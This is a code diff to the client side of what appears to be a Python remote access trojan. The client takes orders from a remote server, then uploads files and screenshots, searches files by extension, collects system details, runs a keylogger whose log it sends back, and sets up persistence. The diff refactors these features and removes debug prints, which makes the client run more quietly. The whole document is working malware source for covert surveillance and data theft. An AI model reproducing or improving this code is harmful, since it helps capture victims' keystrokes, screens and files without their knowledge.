@@ -25,6 +25,7 @@ sys.path.append("dependencies/")
 import communicator
 import keylog
 import cpuinfo 
+import utilities 
 import persistance
 
 
@@ -60,6 +61,7 @@ class clientServerExchanger:
             
             if 'terminate' in self.command :
                 self.closeClient()
+                self.stopProcess()
                 break 
             elif 'grab' in self.command :
                 self.transfer(self.command)
@@ -130,8 +132,8 @@ class clientServerExchanger:
             data = f.read(1024)
             self.communicator.sendBytes(data)
             sizeSended+=len(data)
-            print(len(data))
-            print("Sended ->" , sizeSended/totalSize*100 )
+            #print(len(data))
+            #print("Sended ->" , sizeSended/totalSize*100 )
             
             if (len(data) < 1024 ):
                 break 
@@ -141,16 +143,14 @@ class clientServerExchanger:
     
     def screenShot(self):
         
-        dirpath = tempfile.mkdtemp()
-        try :     
-            path = dirpath+ "\\img.jpg"
-            ImageGrab.grab().save(path, "JPEG")
+        path = utilities.screenshot()
+        if "Error" in path:
+            self.communicator.send("[-] Error while getting the screen")
+        else:
             self.communicator.send(datetime.datetime.now().strftime('%m_%d_%Y-%H_%M_%S'))
-            print(path)
             self.transfer("grab*"+path)
             
-        except Exception as e :
-            self.communicator.send("[-] An Error appened during the capture -> " , e )
+        
             
     def searchFilesWithExt(self , command):
         command = command[7:].replace("\\" , "/")
@@ -166,43 +166,7 @@ class clientServerExchanger:
         
         
     def getInfo(self):
-        cpu_percent ="Cpu utlisation -> " + str(psutil.cpu_percent())+ "%"
-        cpu_cores =  "Cpu Cores      -> " + str(psutil.cpu_count()) 
-        cpu_freq =   "Cpu Frequency  -> " + str(psutil.cpu_freq()[0]/1000) + " Ghz "
-        cpu_name =   "Cpu name       -> " + str(cpuinfo.cpu.info[0]["ProcessorNameString"])
-        
-        
-        
-        memory_count = "Memory ammount -> " + str(psutil.virtual_memory()[0]/(1024*1000000)) + " GB"
-        memory_usage = "Memory Usage   -> " + str(psutil.virtual_memory()[2]) + " %"
-        
-        currentWorkingDir = "Current Dir    -> " + str(os.getcwd().replace("\\" ,"/"))
-        
-        osInfo = platform.uname()
-        
-        pcName = "Pc name         -> " + str(osInfo[1])
-        
-        osName = "Os Info         ->  " + str(osInfo[0]) + str(osInfo[2]) + "  " + str(osInfo[3]) + " <> " + str(osInfo[4])
-        pythonVersion = "Python Version -> " +  str(sys.version) 
-        
-        pythonExecutableDir = "Exec path         -> " + str(os.path.realpath(os.path.dirname(sys.argv[0]))) 
-        
-        to_return = cpu_name + "\n"\
-                + cpu_cores + "\n"\
-                + cpu_freq + "\n"\
-                + cpu_percent + "\n"\
-                + "#############################" + "\n"\
-                + memory_count + "\n"\
-                + memory_usage + "\n"\
-                + "#############################" + "\n"\
-                + pcName + "\n"\
-                + osName + "\n"\
-                + pythonVersion + "\n"\
-                + pythonExecutableDir + "\n"\
-                + currentWorkingDir + "\n"\
-
-                
-        self.communicator.send(to_return)
+        self.communicator.send(utilities.infos())
        
         
     def persistance(self , command):
@@ -222,6 +186,7 @@ class clientServerExchanger:
         
         else:
             self.communicator.send("Command not understand")
+            
         
     def keylog(self, command):
         
@@ -233,7 +198,6 @@ class clientServerExchanger:
                 self.communicator.send("[-] Keyboard already running")
         
         elif "getlog" in command:
-            print("GetLog")
             self.communicator.send(self.keyloger.getLog())
        
         elif "stop" in command:
@@ -242,11 +206,14 @@ class clientServerExchanger:
                 self.communicator.send("[+] Keylog Stopped")
             else:
                 self.communicator.send("[-] Keylog is not started")
+        
+        else:
+            self.communicator.send("[-] Command not understood")
     
     def stopProcess(self):
-        
         if self.keyloger.isAlive():
             self.keyloger.stopKeyLog()
+
             
        
 if __name__ == "__main__":
